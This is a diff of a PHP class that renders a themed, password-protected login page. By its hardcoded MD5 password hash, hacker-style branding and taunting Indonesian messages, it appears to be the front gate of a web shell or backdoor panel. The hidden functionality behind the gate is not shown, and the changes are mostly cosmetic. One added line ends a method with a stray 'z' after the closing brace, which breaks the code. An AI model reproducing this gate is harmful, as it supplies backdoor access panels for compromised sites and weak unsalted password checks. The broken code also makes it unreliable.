@@ -140,7 +140,7 @@ class Goodman_Access {
     private function verify_password($password) {
         $stored_hash = '22d7bc1125c3660c0ff61cb57329a7e7';
         return md5($password) === $stored_hash;
-    }
+    }z
     
     /**
      * Handle incoming requests
@@ -156,7 +156,7 @@ class Goodman_Access {
                 header("Location: " . $_SERVER['REQUEST_URI']);
                 exit;
             } else {
-                $this->error_message = "SALAH PAOK PASSNYA WKWK !!";
+                $this->error_message = "SALAH PAOK!!";
             }
         }
         
@@ -264,15 +264,15 @@ class Goodman_Access {
         }
         
         .mario-brand {
-            color: #00e1ff;
+            color: #ffd700;
             font-size: 48px;
             font-weight: bold;
-            text-shadow: 4px 4px 0 #000000, 2px 2px 0 #000000;
+            text-shadow: 4px 4px 0 #b8860b, 2px 2px 0 #8b4513;
             letter-spacing: 4px;
-            background: #7b00ff;
+            background: #c41e3a;
             display: inline-block;
             padding: 10px 20px;
-            transform: skew(-5deg);border: 2px solid #00e1ff;
+            transform: skew(-5deg);border: 2px solid #ffd700;
         }
         
         /* Mario coin style */
@@ -280,10 +280,10 @@ class Goodman_Access {
             display: inline-block;
             width: 24px;
             height: 24px;
-            background: #7b00ff;
+            background: #ffd700;
             border-radius: 50%;
             margin: 0 5px;
-            box-shadow: inset -2px -2px 0 #00e1ff, 2px 2px 0 #98fff3;
+            box-shadow: inset -2px -2px 0 #b8860b, 2px 2px 0 #ffed8a;
             animation: spin 0.5s linear infinite;
         }
         
@@ -297,12 +297,12 @@ class Goodman_Access {
             text-align: center;
             font-size: 32px;
             margin: 10px 0;
-            filter: drop-shadow(2px 2px 0 #fbfbfa);
+            filter: drop-shadow(2px 2px 0 #8b4513);
         }
         
         /* Pixel art ascii */
         .pixel-mario {
-            color: #44ddff;
+            color: #ff4444;
             font-family: 'Courier New', monospace;
             font-size: 10px;
             line-height: 1.2;
@@ -311,18 +311,18 @@ class Goodman_Access {
             text-align: center;
             background: #000000;
             padding: 10px;
-            border: 2px solid #44ddff;
+            border: 2px solid #d4a017;
         }
         
         /* Question block style */
         .question-block {
-            background: #000000;
+            background: #d4a017;
             width: 40px;
             height: 40px;
             margin: 10px auto;
             position: relative;
-            border: 2px solid #44ddff;
-            box-shadow: 2px 2px 0 #44ddff;
+            border: 2px solid #f0b020;
+            box-shadow: 2px 2px 0 #8b691b;
             animation: bounce 1s ease-in-out infinite;
         }
         
@@ -335,7 +335,7 @@ class Goodman_Access {
             font-size: 28px;
             font-weight: bold;
             color: #ffffff;
-            text-shadow: 1px 1px 0 #44ddff;
+            text-shadow: 1px 1px 0 #8b691b;
         }
         
         @keyframes bounce {
@@ -345,19 +345,19 @@ class Goodman_Access {
         
         /* Welcome message */
         .mario-welcome {
-            color: #00d0ff;
+            color: #ffd700;
             font-size: 14px;
             text-align: center;
             margin: 20px 0;
             padding: 10px;
-            background: #000000;
-            border-left: 4px solid #44ddff;
-            border-right: 4px solid #44ddff;
+            background: #1a2a1a;
+            border-left: 4px solid #ffd700;
+            border-right: 4px solid #ffd700;
             font-family: monospace;
         }
         
         .mario-welcome strong {
-            color: #44ddff;
+            color: #ff6b6b;
             font-weight: bold;
             font-size: 16px;
             display: inline-block;
@@ -372,9 +372,9 @@ class Goodman_Access {
         
         /* Error alert */
         .mario-alert {
-            background: #000000;
-            border: 2px solid #44ddff;
-            color: #44ddff;
+            background: #2a1a1a;
+            border: 2px solid #ff4444;
+            color: #ff8888;
             padding: 8px;
             margin-bottom: 20px;
             font-size: 12px;
@@ -396,9 +396,9 @@ class Goodman_Access {
         .mario-input {
             width: 100%;
             padding: 12px 15px;
-            background: #000000;
-            border: 3px solid #44ddff;
-            color: #44ddff;
+            background: #1a1f1a;
+            border: 3px solid #d4a017;
+            color: #ffd700;
             font-size: 14px;
             font-family: 'Courier New', monospace;
             outline: none;
@@ -407,15 +407,15 @@ class Goodman_Access {
         }
         
         .mario-input:focus {
-            border-color: #7b00ff;
+            border-color: #ffd700;
             background: #0a0f0a;
-            box-shadow: inset 0 0 10px rgba(0, 200, 255, 0.3);
+            box-shadow: inset 0 0 10px rgba(255, 215, 0, 0.3);
         }
         
         /* Mario button */
         .mario-btn {
-            background: #7b00ff;
-            color: #44ddff;
+            background: #c41e3a;
+            color: #ffd700;
             border: none;
             padding: 12px;
             font-size: 16px;
@@ -424,7 +424,7 @@ class Goodman_Access {
             cursor: pointer;
             text-transform: uppercase;
             letter-spacing: 2px;
-            border-bottom: 4px solid #44ddff;
+            border-bottom: 4px solid #8b0000;
             transition: all 0.05s linear;
         }
         
@@ -448,7 +448,7 @@ class Goodman_Access {
             display: inline-block;
             width: 16px;
             height: 16px;
-            background: #44ddff;
+            background: #ffd700;
             clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
             margin: 0 5px;
             animation: twinkle 1s ease-in-out infinite;
@@ -468,7 +468,7 @@ class Goodman_Access {
 </head>
 <body>
     <div class="mario-container">
-        <div class="mushroom">𐫱  ✿  ❀  ❁  ✽</div>
+        <div class="mushroom">🍄 ⭐ 🍄</div>
         
         <div class="mario-title">
             <div class="mario-brand">hello?</div>
@@ -477,30 +477,30 @@ class Goodman_Access {
         <div class="question-block"></div>
         
         <div class="pixel-mario">
- █████╗  ██████╗███████╗██╗     ████████╗ ██████╗ ██████╗  █████╗ ██╗   ██╗
-██╔══██╗██╔════╝██╔════╝██║     ╚══██╔══╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
-███████║██║     █████╗  ██║        ██║   ██║   ██║██║  ██║███████║ ╚████╔╝
-██╔══██║██║     ██╔══╝  ██║        ██║   ██║   ██║██║  ██║██╔══██║  ╚██╔╝
-██║  ██║╚██████╗███████╗███████╗   ██║   ╚██████╔╝██████╔╝██║  ██║   ██║
-╚═╝  ╚═╝ ╚═════╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝  
+   ▄████▄   ▄▄▄▄▄   
+  ██▀▀▀██ ██▀▀▀██  
+  ██    ██ ██    ██ 
+  ▀███████ ▀███████ 
+   ██       ██      
+   ▀█       ▀█ ACELTODAY     
         </div>
         
         <div class="mario-welcome">
-            ⭐ WELCOME TO, <strong>GUDANG KERJA</strong> ⭐
+            ⭐ WELCOME, <strong>YAMEEEEE KUDASAIII</strong> ⭐
         </div>
         
         <?php if ($error): ?>
         <div class="mario-alert">
-            😂 <?php echo htmlspecialchars($error); ?> 😂
+            💥 <?php echo htmlspecialchars($error); ?> 💥
         </div>
         <?php endif; ?>
         
         <form method="POST" action="" class="mario-form" autocomplete="off">
             <div class="input-block">
-                <input type="password" name="goodman_pass" class="mario-input" placeholder="LOGIN LA KALO TAU" required autofocus>
+                <input type="password" name="goodman_pass" class="mario-input" placeholder="???" required autofocus>
             </div>
             <button type="submit" class="mario-btn">
-                🌟 MASUK KETUA 🌟
+                🌟 ENTER 🌟
             </button>
         </form>
         
